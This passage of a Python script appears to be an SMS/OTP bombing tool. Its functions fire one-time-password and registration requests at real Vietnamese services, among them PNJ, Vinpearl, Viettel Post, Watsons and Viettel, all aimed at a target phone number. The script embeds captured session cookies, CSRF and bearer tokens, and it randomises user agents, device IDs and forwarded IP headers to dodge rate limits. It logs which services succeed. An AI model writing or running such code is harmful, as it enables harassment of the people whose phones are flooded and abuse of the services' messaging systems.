                "User-Agent": get_agent(),
                "Accept-Encoding": "gzip, deflate, br",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua-mobile": "?1",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-language": "ar,ar-YE;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            json={"phoneNumber": phone},
            timeout=15,
        )
        _log("doccen1", r.status_code in (200, 201, 409, 422), r.status_code)
    except Exception as e:
        _log("doccen1", False, err=e)


def king2():
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "authorization": "",
        "content-type": "application/json",
        "domain": "kingfoodmart",
        "origin": "https://kingfoodmart.com",
        "priority": "u=1, i",
        "referer": "https://kingfoodmart.com/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    }
    json_data = {
        "operationName": "SendOtp",
        "variables": {
            "input": {
                "phone": phone,
                "captchaSignature": "AUh02gdJ2znItu66xz2_9BcBV9GpEJnBt2TLRjQR8E4oYUM8MOUaIzo9UIbYoR5iYCS1tFCgV-bXXo5aAhc4PphZgiMyaaKDNeC4MNyVDT5ME4_Sd-u0oY1gNPGS74QJAiRCJQ3aFU55oFpZpvKGID_msRlD:U=830229ce60000000",
            },
        },
        "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}",
    }
    try:
        response = requests.post(
            "https://api.onelife.vn/v1/gateway/",
            headers=headers,
            json=json_data,
            timeout=15,
        )
        _log("king2", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("king2", False, err=e)


def king3():
    cookies = {
        "CDPI_VISITOR_ID": "78166678-ea1e-47ae-9e12-145c5a5fafc4",
        "CDPI_RETURN": "New",
        "CDPI_SESSION_ID": "f3a5c6c7-2ef6-4d19-a792-5e3c0410677f",
        "XSRF-TOKEN": "eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D",
        "mypnj_session": "eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D",
    }
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "dnt": "1",
        "origin": "https://www.pnj.com.vn",
        "priority": "u=0, i",
        "referer": "https://www.pnj.com.vn/customer/login",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = {
        "_method": "POST",
        "_token": "0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU",
        "type": "zns",
        "phone": phone,
    }
    try:
        response = requests.post(
            "https://www.pnj.com.vn/customer/otp/request",
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=15,
        )
        _log("king3", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("king3", False, err=e)


def vinwonders():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://booking.vinwonders.com",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": get_agent(),
    }
    json_data = {"channel": 10, "UserName": phone, "Type": 1, "OtpChannel": 1}
    try:
        r = requests.post(
            "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
            headers=headers,
            json=json_data,
        )
        _log("vinwonders", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("vinwonders", False, err=e)


def king15():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://booking.vinwonders.com",
        "priority": "u=1, i",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    json_data = {
        "channel": 10,
        "UserName": phone,
        "Type": 1,
        "OtpChannel": 1,
    }
    response = requests.post(
        "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
        headers=headers,
        json=json_data,
    )


def viettelpost():
    cookies = {
        "QUIZIZZ_WS_COOKIE": "id_192.168.12.141_15001",
        ".AspNetCore.Antiforgery.XvyenbqPRmk": "CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM",
        "_ga": "GA1.1.283730043.1722475009",
    }
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "null",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "FormRegister.FullName": "quoc tien huy",
        "FormRegister.Phone": phone,
        "FormRegister.Password": "123123aA",
        "FormRegister.ConfirmPassword": "123123aA",
        "FormRegister.IsRegisterFromPhone": "True",
        "__RequestVerificationToken": "CfDJ8ASZJlA33dJMoWx8wnezdv-9JDAZiojDWGeKRvEUJqdyE128lDNBqZyxK9-1bDuTNAgW17qbK9uBU6V-VwQFZywRBM06-A6m7VU2ACjP9_OVf1RWEqp2aTwboyIFSzmLAXCbIuwwASKM6jHPCb2IAJ0",
    }
    try:
        r = requests.post(
            "https://id.viettelpost.vn/Account/SendOTPByPhone",
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=25,
        )
        _log("viettelpost", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("viettelpost", False, err=e)


def king13():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://booking.vinwonders.com",
        "priority": "u=1, i",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    json_data = {
        "channel": 10,
        "UserName": phone,
        "Type": 1,
        "OtpChannel": 1,
    }
    try:
        response = requests.post(
            "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
            headers=headers,
            json=json_data,
            timeout=15,
        )
        _log("king13", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("king13", False, err=e)


def king4():
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": "_cdp_user_new; _gcl_au=1.1.1539180309.1734704886; au_id=1711837792; _asm_uid=1711837792; _ac_au_gt=1734704885956; CDPI_VISITOR_ID=cfdb810a-112d-4508-bdf5-328e94772429; _tt_enable_cookie=1; _ttp=FgcRd1T1_6lz67t0qurGtPCWP60.tt.2; CDPI_RETURN=Return; _utm_objs=eyJzb3VyY2UiOiJjaXR5YWRzIiwibWVkaXVtIjoiY3BhIiwiY2FtcGFpZ24iOiJrNTRnR0UiLCJj%0D%0Ab250ZW50IjoiIiwidGVybSI6IiIsInR5cGUiOiJkaXJlY3QiLCJ0aW1lIjoxNzM0NzA1MDYwOTcw%0D%0ALCJjaGVja3N1bSI6IioifQ%3D%3D; _atm_objs=eyJzb3VyY2UiOiJpbWMtZy1jb2MtY29jLXNlYXJjaCIsIm1lZGl1bSI6ImNwYyIsImNhbXBhaWdu%0D%0AIjoiQXdvLVE0IiwiY29udGVudCI6IjQ0ODcxOTQwIiwidGVybSI6Im5oJUUxJUJBJUFCbiUyMGMl%0D%0ARTElQkElQTd1JTIwaCVDMyVCNG4iLCJ0eXBlIjoiYXNzb2NpYXRlX3V0bSIsImNoZWNrc3VtIjoi%0D%0AKiIsInRpbWUiOjE3MzQ4MzgyMTIxNTN9; _pk_ref.564990245.4a15=%5B%22Awo-Q4%22%2C%22nh%E1%BA%ABn%20c%E1%BA%A7u%20h%C3%B4n%22%2C1734838212%2C%22https%3A%2F%2Fcontext.qc.coccoc.com%2F%22%5D; _pk_ses.564990245.4a15=*; utm_notifications=%7B%22utm_source%22%3A%22imc-g-coc-coc-search%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_content%22%3A%2244871940%22%2C%22utm_campaign%22%3A%22Awo-Q4%22%2C%22aff_sid%22%3A%22%22%7D; CDPI_SESSION_ID=89233897-fae2-4cd7-9255-dd3342921ede; _asm_visitor_type=r; _cdp_cfg=1; cdp_session=1; _gid=GA1.3.968284004.1734838216; _gat_UA-26000195-1=1; _clck=1gqcnrc%7C2%7Cfrx%7C0%7C1815; recently_products=null; _ga_K1CDGBJEK0=GS1.1.1734838215.2.0.1734838229.0.0.0; _asm_ss_view=%7B%22time%22%3A1734838214172%2C%22sid%22%3A%225683956380156401%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-12-22T03%3A30%3A30%22%2C%22duration%22%3A16228%7D; _clsk=1x6x9aw%7C1734838230898%7C2%7C1%7Cq.clarity.ms%2Fcollect; _pk_id.564990245.4a15=1711837792.1734704886.2.1734838231.1734838212.; _ac_client_id=1711837792.1734838232; _ac_an_session=zmzlzrzgzqzmzlzgzrzjzizmzlznzjzizdzizkzizizrzgzkzkzqzhzdzizkzgznzrzgzrzhzgzhzdzizdzizkzgznzrzgzrzhzgzhzdzizkzgznzrzgzrzhzgzhzdzizdzlzizdzizd2f27zdzgzdzlzmzkzjzlzdzd3cz62qznz62szq2725z83626271x; _ga_3S12QVTD78=GS1.1.1734838213.2.1.1734838231.42.0.0; _ga=GA1.3.587610544.1734704887; _ga_TN4J88TP5X=GS1.3.1734838216.2.1.1734838231.45.0.0; XSRF-TOKEN=eyJpdiI6IjNNclE5UTNuamx1ZkJ1YlE0QzdxRGc9PSIsInZhbHVlIjoieEFSU1VYNStlY1FVWGJ2SkxLU0Y0ajJja2Z5M1oyVDhjL3YvREdVc1FyVVRidVdKaXhtTS9NR3ZSNldtL0l2Qi9tbFl5ckpMbWV0STBpODd4OFFJUnhLSGhaVHJDbWpEVEJRY3doWGVjUDlncThjUGVSS0pSMjJVVG1Ea3VVYkoiLCJtYWMiOiIzZDU2YTY1YmVlMmJiZGNkYzQwZDZlOWFlNGM1MmM5YTI5NGE5YmE5MjQ1N2E2NTg5M2E2YTAyYTgyNDk1YmQ2IiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjNORDNqYWNqejl5WmtXakdpdkltbXc9PSIsInZhbHVlIjoiYXUxK3NaQXhhcmJabkdyRXR1TWR2VVJxWTBnYUxPN1o2M2I3VmEvcS96STlYUjloanNBb2krUkpJS2E3bHl5Q3JxS3hyL04zNW5rSnhyT2xBbnd6Wm5oTmcvMWsrTFNNcHNhdVdHTEJ2b0ZGL3hkNjZoQkpHMitzS21GRWV0R08iLCJtYWMiOiIzMzVmNDcwY2UxYmIyNGE2M2JjMmJlZTIwOTM0NzQ2YjdjOTE3M2QwOWM0ZWZlYmUwNThjY2M0NmQ4ODJmYzAxIiwidGFnIjoiIn0%3D; _ga_FR6G8QLYZ1=GS1.1.1734838213.2.1.1734838238.0.0.0",
        "origin": "https://www.pnj.com.vn",
        "priority": "u=0, i",
        "referer": "https://www.pnj.com.vn/customer/login",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    data = {
        "_method": "POST",
        "_token": "Ep2Eu31PveWUdQdZk0Jkk0OKtve59Dj87iEe2Egv",
        "type": "sms",
        "phone": phone,
    }
    try:
        response = requests.post(
            "https://www.pnj.com.vn/customer/otp/request",
            headers=headers,
            data=data,
            timeout=15,
        )
        _log("king4", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("king4", False, err=e)


def king5():
    cookies = {
        "CDPI_VISITOR_ID": "78166678-ea1e-47ae-9e12-145c5a5fafc4",
        "CDPI_RETURN": "New",
        "CDPI_SESSION_ID": "f3a5c6c7-2ef6-4d19-a792-5e3c0410677f",
        "XSRF-TOKEN": "eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D",
        "mypnj_session": "eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D",
    }
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "dnt": "1",
        "origin": "https://www.pnj.com.vn",
        "priority": "u=0, i",
        "referer": "https://www.pnj.com.vn/customer/login",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = {
        "_method": "POST",
        "_token": "0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU",
        "type": "zns",
        "phone": phone,
    }
    try:
        response = requests.post(
            "https://www.pnj.com.vn/customer/otp/request",
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=15,
        )
        _log("king5", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("king5", False, err=e)


def king6():
    cookies = {
        "dtCookie": "v_4_srv_36_sn_78389D143AE67D0166F10A549E950094_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0",
        "PIM-SESSION-ID": "KeLTcCvBcFaAM7Ks",
        "ROUTE": ".api-6df67c4656-d6j6p",
        "AKA_A2": "A",
        "ak_bmsc": "E31AE1DCC8A5D8FB8538C991DE43DD4C~000000000000000000000000000000~YAAQyb0oFxTKab6QAQAAjFCE2Rjt8BLAhfR7mZCaJ7IABI/6nBYaj36Db0p6ZJDzG4KhkHXFPqZ+TnrJxNPp4QtxpGiNRy9IKWXIvkcbRaERswfeqZes6xN9l1tyZ9tnVqvGNxY6fWmj7bJ/wAqBmbn5nkthNqsOV248fyk0H2mnRw3a0cIWX4LNQFoPCYLwev0IjF5zAUaqdt9br3QIWk13QlTGmHkD9Zg0fcm17eh9ZiovLu+OxNX8+qm0WFfJ42UiWcntVhKCgAyle7Bt5+/YeKGSZBPvEWp8Z7pHm74JBvOjVnNUyQhHiu1G5MLaQ562LdPZQ6HlBlzKpXQz8hljtJGmaqO1ZQub5Uw8krLkElS252p4dArEACm3NIKvFiR5FgcGCk0UXFX0",
        "authorization": "eIoVNH5XuB4bIiORjaaVO1iXwSU",
        "token_type": "guest",
        "bm_mi": "E2BE16B4175E923DABE3D82FBFF24664~YAAQyb0oF2Hjab6QAQAAN3uE2RgWjYGGJ8/uZoZObQVn1GO7IzJvpNTQqMJ33/xmfZhwdecFR3pZIrqQ6/hKiWsQcf7lkJBbLSAvwZ5XospWLtNcpsq58b1aBEPEL5VTicWc2Y0B27B1ehuBPTQaLBtz57IBvCiU7dImV33WirAOpq4wzpdHplX/ORU+ZvS1VveWGSDeWdBKyLi33cNInyM4lk0BXQT/Rd1cmhefuU2PK3D7S+oM86KiB6FUpnhaMH8du102SXZzAmELLItlAaR79Pgq7oX1pMjlC13gtNSSrd+88JTPT5HcK6fLuABMoK6/gRu6ZyMw~1",
        "_abck": "2EF1DA00357C893E967384BA03295C65~0~YAAQ31JNGxgxINmQAQAAGrmE2QzWa3gzvT6muyPn3xQyG66nWtsjmmz56fF161mJuOXOni/D1IiTzKVDPx6j58OfS7doDfha8HL37VbG5Xd3sTBiEQCOqO6qKdCPM+ldNYZQXfS06JbrCDjT5tmBX4MQAJ19emvH+u5757kK+WeNDROEKhmsqW/D/3jV3YI2perZITclDJxuuzEJKb33DGcc2EqLjRX7zzenCx0PyHUo60WvrR68rbo1hmzXy7o88P/wPBtfhKE2g2XHW7jaLDw3vpZvC2pg+QDS8MQMctG+JDbn6O/mi73YWqg3mBUonKzDs9k970iXZOsGSMYfzjrJM6Pkt8A5tW1a79TmH7c+FeprSaQb5SFDGtynUy0oM26QSNLFnamCcUdtQWnGtalq5WOA2MwEfVo7uL0vWaSNG4wr43FS+v4v/P4ylpx4o10TDcWCVVQJnzphjyhwxCR9i2b8WmbKKis8WH7tls3JspZbrRwbOg==~-1~-1~-1",
        "bm_sv": "65A51408418F3652B39E8481B85F70F3~YAAQ31JNGxkxINmQAQAAGrmE2RgTmiy1bNYdgQ4OjVlKLE7jmNL2DWFFfLF2mhgB1U2RGfPziEY3IYs2fKuknLfWZPEGvEZbSCKaqtoDgeT8Olk4p8YddYovOJ4S91mchuMPD2c0uOCKPLsMyc1SN2/ailEI+zLIn+S38H01hI+cTm30BM0ut7i1ueHR6SPFi9KpgZShseXoIn26/jAj4F6axZaLc3wLA5GQaEBcRsUGBbxTtA1aeMKtY9sIKl475w==~1",
        "bm_sz": "38994E99080E4985C36D7F989AEB7C92~YAAQ31JNGxoxINmQAQAAG7mE2RidSEMD/NtmBF9EO4NMTjX7d4awNQFjWTKEMuyzzi2BeaemzAuTOhgMAIPbOQiEjHfkN4C7S/z8uy4EfOdlRUNrny86trif+7fc9EtWIhmmJAbXv0+wOTXn8nVwgtKLWdtF2phFNfOkHtCEp5vT1fPcy48wj0LvXUrQk79lHolDtz/RHK1AiYu7k6an3/Kr21zMiK3+73jr43XGIPF9PZkWyvGREnG2fwYSQfb5b2l+NxMxVnANG/vVzOhBhHvYKE03/eGUgbIbM6OGzkeWovx284X0BrUXkKGzaWXpxTg69k/y+Enu0t+cyEkDZf8EjnJL7yRPk7RDPJ1LM75CjY+scUUVkrs7dqe10RIdC5l2R9lcDSZ7CzQXMbMirxuPfC96MS+E2doINPeHBIZUFyZCWnaKYRHzRB6uxQ==~4277571~3687480",
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "authorization": "bearer eIoVNH5XuB4bIiORjaaVO1iXwSU",
        "cache-control": "no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
        "content-type": "application/json",
        "expires": "0",
        "if-modified-since": "Mon, 22 Jul 2024 08:17:50 GMT",
        "origin": "https://www.watsons.vn",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "queue-target": "https://www.watsons.vn/vi/register",
        "queueit-target": "https://www.watsons.vn/vi/register",
        "referer": "https://www.watsons.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
        "vary": "*",
    }
    params = {
        "formId": "registrationOTPForm_Web3",
        "lang": "vi",
        "curr": "VND",
    }
    json_data = {
        "uid": "",
        "action": "REGISTRATION",
        "countryCode": "84",
        "target": phone,
        "type": "SMS",
    }
    try:
        r = requests.post(
            "https://api.watsons.vn/api/v2/wtcvn/otpToken",
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
            timeout=15,
        )

        _log("king6", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("king6", False, err=e)


def vttelecom():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "origin": "https://vietteltelecom.vn",
        "referer": "https://vietteltelecom.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    }
    try:
        requests.post(
            "https://apigami.viettel.vn/mvt-api/myviettel.php/getOtp",
            params={"lang": "vi", "msisdn": phone, "type": "register"},
            headers=headers,
        )
        r = requests.post(
            f"https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={phone}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login",
            headers=headers,
        )
        _log("vttelecom", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("vttelecom", False, err=e)


def otp7():
    NAME = f"{random.choice(ho)} {random.choice(ten)}"
    form_event_id = f"ladi.{int(time.time()*1000)}.{random.randint(10**10, 10**11-1)}"
    gclid = f"CjwKCAjwyMnNBhBNEiwA-Kcguye9KoB54bltZlFsw3V-X-vz6J9ra-p-Qdk2Rhn_337127ACq6iLsxoC_{random.randint(1000, 9999)}QAvD_BwE"
    headers = {
        "Host": "api1.ldpform.com",
        "Accept": "*/*",
        "Sec-Fetch-Site": "cross-site",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Mode": "cors",
        "Content-Type": "application/json",
        "Origin": "https://brand.lavenderbychang.com",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://brand.lavenderbychang.com/",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
    }
    json_data = {
        "form_config_id": "624674514bbb65005b674edd",
        "ladi_form_id": "FORM503",
        "ladipage_id": "67596872ff2f090134da3e6d",
        "tracking_form": [
            {
                "name": "url_page",
                "value": f"https://brand.lavenderbychang.com/ctkm-lavender?gclid={gclid}",
            },
            {"name": "utm_source", "value": ""},
            {"name": "utm_medium", "value": ""},
            {"name": "utm_campaign", "value": ""},
            {"name": "utm_term", "value": ""},
            {"name": "utm_content", "value": ""},
            {"name": "variant_url", "value": ""},
            {"name": "variant_content", "value": ""},
        ],
        "form_data": [
            {"name": "name", "value": NAME},
            {"name": "phone", "value": phone},
            {"name": "gclid_field", "value": gclid},
        ],
        "data_key": None,
        "status_send": 2,
        "merge_address": False,
        "total_revenue": 0,
        "time_zone": 7,
        "event_id": form_event_id,
    }
    try:
        r = requests.post(
            "https://api1.ldpform.com/sendform",
            headers=headers,
            json=json_data,
            timeout=15,
        )
        _log("otp7", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("otp7", False, err=e)


def call8():

    boundary = str(uuid.uuid4())
    extra = random_headers()
    headers = {
        "accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip",
        "baggage": f"sentry-environment=production,sentry-public_key=8c9a0cda91a6818800ae75ebc521418f,sentry-release=gas.dung.com.gas24h%4025.6.18%2B250618,sentry-sample_rand={random.random()},sentry-trace_id={hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}",
        "Connection": "Keep-Alive",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Host": "spj.daukhimiennam.com",
        "sentry-trace": f"{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}-{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}",
        "User-Agent": extra.get("User-Agent", "okhttp/4.11.0"),
        "X-Device-ID": extra.get("X-Device-ID", ""),
        "X-Forwarded-For": extra.get("X-Forwarded-For", ""),
        "Accept-Language": extra.get("Accept-Language", "vi-VN"),
    }
    json_data = {
        "app_type": 3,
        "version_code": "250618",
        "platform": 1,
        "token": "",
        "acc": "",
        "device_imei": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "app_customer_type": "",
        "role_id": "",
        "soft_version": 1,
        "phone": phone,
        "gcm_device_token": f"c{random.randint(1000000,9999999)}:APA91b{hashlib.md5(str(random.random()).encode()).hexdigest()[:20]}",
        "device_name": random.choice(["SM-G998B", "Xiaomi 13 Pro", "iPhone15,2"]),
        "device_os_version": str(random.randint(9, 15)),
    }
